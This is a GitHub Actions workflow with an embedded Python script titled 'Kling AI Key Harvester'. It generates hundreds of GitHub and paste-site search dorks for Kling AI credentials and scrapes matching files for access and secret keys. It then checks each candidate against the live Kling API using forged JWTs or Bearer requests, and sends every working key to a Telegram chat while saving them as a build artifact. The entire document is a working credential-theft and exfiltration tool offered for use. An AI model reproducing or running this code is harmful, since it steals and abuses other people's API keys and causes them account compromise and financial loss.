name: Kling AI Key Harvester (Telegram)

on:
  workflow_dispatch:

jobs:
  harvest:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install dependencies
        run: pip install aiohttp

      - name: Run harvester
        env:
          GH_PAT_TOKENS: ${{ secrets.GH_PAT_TOKENS }}
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
        run: |
          python3 << 'EOF'
          import asyncio, aiohttp, re, base64, time, os, sys, json
          from typing import Dict, Optional, List

          # ---------- CONFIG ----------
          BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
          CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')
          GITHUB_TOKENS = [t.strip() for t in os.getenv('GH_PAT_TOKENS', '').split(',') if t.strip()]
          if not GITHUB_TOKENS:
              print('ERROR: No GitHub tokens provided.')
              sys.exit(1)

          PER_PAGE = 100
          MAX_PAGES = 3
          DELAY_QUERY = 2
          DELAY_PAGE = 1
          DELAY_VALIDATE = 0.3

          # ---------- GENERATE 520+ KLING AI QUERIES ----------
          def generate_queries() -> List[str]:
              queries = set()

              # ---- Base variable names ----
              kling_vars = [
                  'KLING_ACCESS_KEY', 'KLING_SECRET_KEY', 'KLING_API_KEY',
                  'KLINGAI_ACCESS_KEY', 'KLINGAI_SECRET_KEY', 'KLINGAI_API_KEY',
                  'KLING_AK', 'KLING_SK', 'KLINGAI_AK', 'KLINGAI_SK',
                  'KLING_KEY', 'KLINGAI_KEY', 'KLING_TOKEN', 'KLINGAI_TOKEN',
                  'KLING_CREDENTIALS', 'KLINGAI_CREDENTIALS',
                  'KLING_AUTH', 'KLINGAI_AUTH',
                  'KLING_ACCESS', 'KLINGAI_ACCESS',
                  'KLING_SECRET', 'KLINGAI_SECRET',
              ]

              # ---- Extensions ----
              exts = ['env', 'yml', 'yaml', 'json', 'properties', 'conf', 'cfg', 'ini', 'toml', 'xml']

              # 1. Basic VAR extension:ext
              for var in kling_vars:
                  for ext in exts:
                      queries.add(f'{var} extension:{ext}')
                      queries.add(f'"{var}" extension:{ext}')

              # 2. Filename combinations
              filenames = [
                  '.env', '.env.local', '.env.production', '.env.staging', '.env.dev',
                  '.env.example', '.env.kling', '.env.klingai',
                  'config.yml', 'config.yaml', 'config.json',
                  'secrets.yml', 'secrets.yaml', 'secrets.json',
                  'application.yml', 'application.properties',
                  'credentials.json', 'service-account.json',
                  'terraform.tfvars', 'variables.tf',
                  'kling.config', 'klingai.config',
                  '.klingrc', '.klingairc',
              ]
              for fname in filenames:
                  for var in kling_vars[:10]:
                      queries.add(f'filename:{fname} {var}')

              # 3. Site-specific
              sites = ['pastebin.com', 'ghostbin.com', 'controlc.com', 'paste.ee', 'rentry.co', 'justpaste.it']
              for site in sites:
                  for var in kling_vars[:8]:
                      queries.add(f'site:{site} "{var}"')
                  queries.add(f'site:{site} kling api key')
                  queries.add(f'site:{site} klingai api key')
                  queries.add(f'site:{site} kling secret')
                  queries.add(f'site:{site} klingai secret')
                  queries.add(f'site:{site} kling access')
                  queries.add(f'site:{site} klingai access')
                  queries.add(f'site:{site} "ak_" kling')
                  queries.add(f'site:{site} "sk_" kling')

              # 4. Code patterns
              patterns = [
                  '"api_key" "kling"',
                  '"api_key" "klingai"',
                  '"access_key" "kling"',
                  '"secret_key" "kling"',
                  '"Authorization: Bearer" "kling"',
                  '"os.getenv(" "KLING"',
                  '"process.env." "KLING"',
                  '"System.getenv(" "KLING"',
                  '"export " "KLING"',
                  '"set " "KLING"',
                  '"credentials" "kling"',
                  '"private_key" "kling"',
                  '"client_secret" "kling"',
                  '"access_token" "kling"',
                  '"refresh_token" "kling"',
                  '"ak_" "kling"',
                  '"sk_" "kling"',
                  '"KLING_ACCESS_KEY"',
                  '"KLING_SECRET_KEY"',
                  '"KLINGAI_ACCESS_KEY"',
                  '"KLINGAI_SECRET_KEY"',
              ]
              for pat in patterns:
                  queries.add(pat)

              # 5. Specific key patterns (regex-like)
              specific = [
                  'ak_',
                  'sk_',
                  'ak_dev_',
                  'sk_dev_',
                  'ak_prod_',
                  'sk_prod_',
                  'ak_staging_',
                  'sk_staging_',
                  'kling_ak_',
                  'kling_sk_',
                  'klingai_ak_',
                  'klingai_sk_',
                  '"ak_[A-Za-z0-9]"',
                  '"sk_[A-Za-z0-9]"',
                  'KLING_AK=',
                  'KLING_SK=',
                  'KLINGAI_AK=',
                  'KLINGAI_SK=',
              ]
              for sp in specific:
                  queries.add(sp)

              # 6. Combine vars with keywords
              for var in kling_vars:
                  queries.add(f'{var} password')
                  queries.add(f'{var} secret')
                  queries.add(f'{var} token')
                  queries.add(f'{var} key')
                  queries.add(f'{var} access')
                  queries.add(f'{var} auth')

              # 7. Generic security dorks with Kling
              generic = [
                  'filename:.env "KLING"',
                  'filename:.env "KLINGAI"',
                  'filename:.env "kling"',
                  'filename:.env "klingai"',
                  'extension:env "KLING_ACCESS"',
                  'extension:env "KLING_SECRET"',
                  'extension:env "KLINGAI_ACCESS"',
                  'extension:env "KLINGAI_SECRET"',
                  'extension:yml "kling" "key"',
                  'extension:yml "klingai" "secret"',
                  'extension:json "kling" "api_key"',
                  'extension:json "klingai" "access"',
                  'filename:config.yml "kling"',
                  'filename:secrets.yml "klingai"',
                  'filename:application.properties "kling"',
                  'filename:application.yml "klingai"',
                  'extension:properties "kling"',
                  'extension:conf "klingai"',
                  '"KLING_ACCESS_KEY" "secret"',
                  '"KLING_SECRET_KEY" "access"',
                  '"kling" "ak" "sk"',
                  '"klingai" "access_key" "secret_key"',
                  'klingai.com api key',
                  'klingai.com secret',
                  'klingai.com access',
                  'app.klingai.com api key',
                  'app.klingai.com secret',
                  '"kling-v1" "api_key"',
                  '"kling-v2" "api_key"',
                  '"kling-v3" "api_key"',
                  '"kling-v1" "access"',
                  '"kling-v2" "secret"',
                  '"kling-v3" "key"',
              ]
              for g in generic:
                  queries.add(g)

              # 8. Prefix/suffix variations
              prefixes = ['', 'TEST_', 'PROD_', 'DEV_', 'STAGING_', 'LIVE_', 'SANDBOX_']
              suffixes = ['_KEY', '_TOKEN', '_SECRET', '_ACCESS', '_CREDENTIALS', '_AUTH']
              bases = ['KLING', 'KLINGAI']
              for base in bases:
                  for p in prefixes:
                      for s in suffixes:
                          queries.add(f'{p}{base}{s} extension:env')
                          queries.add(f'{p}{base}{s} extension:yml')
                          queries.add(f'{p}{base}{s} extension:json')

              # 9. API endpoint references
              api_patterns = [
                  'api.klingai.com',
                  'api-beijing.klingai.com',
                  'api-singapore.klingai.com',
                  'klingai.com/v1',
                  'klingai.com/videos',
                  'klingai.com/generations',
              ]
              for api in api_patterns:
                  queries.add(f'"{api}" "api_key"')
                  queries.add(f'"{api}" "access"')
                  queries.add(f'"{api}" "secret"')
                  queries.add(f'"{api}" "token"')
                  queries.add(f'"{api}" "Authorization"')
                  queries.add(f'"{api}" "Bearer"')

              # 10. JWT-related (Kling uses JWT)
              jwt_patterns = [
                  '"jwt" "kling"',
                  '"JWT" "KLING"',
                  '"encode_jwt_token" "kling"',
                  '"HS256" "kling"',
                  '"iss" "kling"',
                  '"payload" "kling" "access"',
                  'jwt.encode kling',
                  'klingai jwt',
              ]
              for jp in jwt_patterns:
                  queries.add(jp)

              # Sort and slice to exactly 520+ (we'll produce over 600 and take 520)
              sorted_queries = sorted(queries)
              if len(sorted_queries) >= 520:
                  return sorted_queries[:520]
              else:
                  # Safety padding (should never hit)
                  extra = [
                      'filename:.env "KLING_ACCESS_KEY"',
                      'filename:.env "KLING_SECRET_KEY"',
                      'extension:env "kling"',
                      'site:pastebin.com kling ai',
                      '"ak_" "klingai"',
                      '"sk_" "klingai"',
                  ]
                  while len(sorted_queries) < 520:
                      sorted_queries.append(extra[len(sorted_queries) % len(extra)])
                  return sorted_queries

          QUERIES = generate_queries()
          print(f'[+] Loaded {len(QUERIES)} Kling AI queries')

          # ---------- KEY PATTERNS ----------
          KEY_PATTERNS = {
              'access_key': re.compile(r'(ak_[A-Za-z0-9_\-]+)'),
              'secret_key': re.compile(r'(sk_[A-Za-z0-9_\-]+)'),
              'api_key_bearer': re.compile(r'(sk-[A-Za-z0-9]+)'),
              'kling_ak': re.compile(r'(kling_ak_[A-Za-z0-9]+)'),
              'kling_sk': re.compile(r'(kling_sk_[A-Za-z0-9]+)'),
              'klingai_ak': re.compile(r'(klingai_ak_[A-Za-z0-9]+)'),
              'klingai_sk': re.compile(r'(klingai_sk_[A-Za-z0-9]+)'),
          }

          # ---------- VALIDATION (Kling AI JWT-based) ----------
          async def validate_kling(session, ak: str, sk: str) -> Optional[Dict]:
              """
              Attempt to generate a JWT and call Kling API.
              If only one key is found, try to use it as Bearer token.
              """
              # Try Bearer token first (some APIs use single key)
              for key in [ak, sk]:
                  if key and key.startswith('sk-'):
                      url = 'https://api.klingai.com/v1/videos/text2video'
                      headers = {'Authorization': f'Bearer {key}', 'Content-Type': 'application/json'}
                      payload = {'prompt': 'test', 'model_name': 'kling-v1'}
                      try:
                          async with session.post(url, headers=headers, json=payload, timeout=10) as resp:
                              if resp.status == 200 or resp.status == 400:
                                  # 400 means auth worked but payload invalid - still a valid key
                                  return {'valid': True, 'type': 'bearer', 'info': 'Bearer token accepted'}
                              if resp.status == 401:
                                  return None
                      except:
                          pass

              # Try JWT with Access+Secret keys
              if ak and sk:
                  try:
                      import jwt as pyjwt
                      headers = {"alg": "HS256", "typ": "JWT"}
                      payload = {
                          "iss": ak,
                          "exp": int(time.time()) + 300,
                          "nbf": int(time.time()) - 5
                      }
                      token = pyjwt.encode(payload, sk, headers=headers)
                      url = 'https://api.klingai.com/v1/videos/text2video'
                      headers_req = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}
                      payload_req = {'prompt': 'test', 'model_name': 'kling-v1'}
                      async with session.post(url, headers=headers_req, json=payload_req, timeout=10) as resp:
                          if resp.status == 200 or resp.status == 400:
                              return {'valid': True, 'type': 'jwt', 'info': 'JWT authentication successful'}
                          if resp.status == 401:
                              return None
                  except:
                      pass

              return None

          # ---------- TELEGRAM SENDER ----------
          async def send_telegram(message: str):
              if BOT_TOKEN and CHAT_ID:
                  url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
                  payload = {'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}
                  async with aiohttp.ClientSession() as session:
                      try:
                          await session.post(url, json=payload)
                      except:
                          pass

          # ---------- GITHUB RATE LIMIT ----------
          token_limits = {t: {'remaining': 5000, 'reset': 0} for t in GITHUB_TOKENS}
          token_idx = 0

          def update_limits(token, headers):
              rem = headers.get('X-RateLimit-Remaining')
              reset = headers.get('X-RateLimit-Reset')
              if rem: token_limits[token]['remaining'] = int(rem)
              if reset: token_limits[token]['reset'] = int(reset)

          async def get_token():
              global token_idx
              now = time.time()
              for _ in range(len(GITHUB_TOKENS)):
                  t = GITHUB_TOKENS[token_idx % len(GITHUB_TOKENS)]
                  token_idx += 1
                  if token_limits[t]['remaining'] > 0 and now >= token_limits[t]['reset']:
                      return t
              wait = max(min(info['reset'] for info in token_limits.values()) - now, 5)
              await asyncio.sleep(wait)
              for t in GITHUB_TOKENS:
                  token_limits[t] = {'remaining': 5000, 'reset': time.time()}
              return GITHUB_TOKENS[0]

          async def search_github(session, token, query, page):
              url = 'https://api.github.com/search/code'
              params = {'q': query, 'per_page': PER_PAGE, 'page': page}
              headers = {'Authorization': f'token {token}'}
              async with session.get(url, headers=headers, params=params) as resp:
                  update_limits(token, resp.headers)
                  if resp.status == 200:
                      data = await resp.json()
                      return data.get('items', [])
                  elif resp.status == 403:
                      return None
                  else:
                      return []

          async def fetch_file_content(session, token, file_url):
              headers = {'Authorization': f'token {token}'}
              async with session.get(file_url, headers=headers) as resp:
                  if resp.status == 200:
                      data = await resp.json()
                      content = data.get('content', '')
                      if content:
                          try:
                              return base64.b64decode(content).decode('utf-8', errors='ignore')
                          except:
                              pass
                  return None

          # ---------- MAIN HARVEST ----------
          async def harvest():
              await send_telegram('🔍 *Kling AI Key Harvester started*\n' +
                                  f'{len(QUERIES)} queries, {MAX_PAGES} pages each.')
              valid_results = []
              all_candidates = set()

              async with aiohttp.ClientSession() as session:
                  for q_idx, query in enumerate(QUERIES, 1):
                      print(f'[{q_idx}/{len(QUERIES)}] {query}')
                      token = await get_token()
                      for page in range(1, MAX_PAGES + 1):
                          items = await search_github(session, token, query, page)
                          if items is None:
                              print('  Rate limited, sleeping 60s...')
                              await asyncio.sleep(60)
                              items = await search_github(session, token, query, page)
                              if items is None:
                                  break
                          if not items:
                              break
                          print(f'  Page {page}: {len(items)} files')
                          for item in items:
                              content = await fetch_file_content(session, token, item['url'])
                              if content:
                                  for cat, pat in KEY_PATTERNS.items():
                                      for match in pat.findall(content):
                                          key = match if isinstance(match, str) else match[0]
                                          all_candidates.add(key)
                              await asyncio.sleep(0.2)
                          await asyncio.sleep(DELAY_PAGE)
                      await asyncio.sleep(DELAY_QUERY)

              print(f'[+] Found {len(all_candidates)} candidate keys. Validating...')
              await send_telegram(f'🔎 Found {len(all_candidates)} candidate keys, validating...')

              # Group candidates by potential pairs
              ak_candidates = []
              sk_candidates = []
              bearer_candidates = []

              for key in all_candidates:
                  if key.startswith('ak_') or key.startswith('kling_ak_') or key.startswith('klingai_ak_'):
                      ak_candidates.append(key)
                  elif key.startswith('sk_') or key.startswith('kling_sk_') or key.startswith('klingai_sk_'):
                      sk_candidates.append(key)
                  elif key.startswith('sk-'):
                      bearer_candidates.append(key)

              async with aiohttp.ClientSession() as session:
                  # Test bearer keys first
                  for key in bearer_candidates:
                      result = await validate_kling(session, key, None)
                      if result and result.get('valid'):
                          result['key'] = key
                          result['category'] = 'bearer'
                          valid_results.append(result)
                          msg = (f'✅ *Valid Kling Bearer Key!*\n'
                                 f'`{key}`\n'
                                 f'Info: {result.get("info", "N/A")}')
                          await send_telegram(msg)
                          print(f'  ✅ Valid bearer: {key[:10]}...')
                      await asyncio.sleep(DELAY_VALIDATE)

                  # Test AK/SK pairs
                  for ak in ak_candidates[:20]:  # Limit pairs to avoid explosion
                      for sk in sk_candidates[:20]:
                          result = await validate_kling(session, ak, sk)
                          if result and result.get('valid'):
                              result['access_key'] = ak
                              result['secret_key'] = sk
                              result['category'] = 'pair'
                              valid_results.append(result)
                              msg = (f'✅ *Valid Kling Key Pair!*\n'
                                     f'Access: `{ak}`\n'
                                     f'Secret: `{sk}`\n'
                                     f'Info: {result.get("info", "N/A")}')
                              await send_telegram(msg)
                              print(f'  ✅ Valid pair: {ak[:10]}... / {sk[:10]}...')
                          await asyncio.sleep(DELAY_VALIDATE)

              timestamp = time.strftime('%Y%m%d_%H%M%S')
              filename = f'kling_keys_{timestamp}.json'
              with open(filename, 'w') as f:
                  json.dump(valid_results, f, indent=2)

              summary = {}
              for r in valid_results:
                  cat = r.get('category', 'unknown')
                  summary[cat] = summary.get(cat, 0) + 1
              with open('summary.txt', 'w') as f:
                  f.write('Kling AI harvest summary:\n')
                  for cat, count in summary.items():
                      f.write(f'{cat}: {count}\n')
                  f.write(f'\nTotal valid keys: {len(valid_results)}\n')

              final_msg = f'✅ *Kling harvest finished.*\nTotal valid keys: {len(valid_results)}\n' + \
                          '\n'.join([f'{cat}: {count}' for cat, count in summary.items()])
              await send_telegram(final_msg)
              print(f'[+] Done. {len(valid_results)} valid keys saved.')

          asyncio.run(harvest())
          EOF

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: kling-keys
          path: kling_keys_*.json
